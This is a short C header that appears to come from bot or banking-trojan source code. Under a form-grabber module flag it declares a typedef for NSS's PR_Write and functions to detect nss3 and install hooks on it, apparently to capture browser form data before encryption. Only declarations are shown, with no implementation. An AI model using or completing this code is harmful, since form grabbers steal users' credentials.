#pragma once
#include "modules.h"

#ifdef MODULE_FORMGRABBER
#include "bot_structs.h"

typedef int(__cdecl *pt_PRWrite)(void *fd, const void *buf, __int32 amount);

BOOL WINAPI IsNss3(HMODULE* phMod);
BOOL WINAPI InstallNss3Hooks();
#endif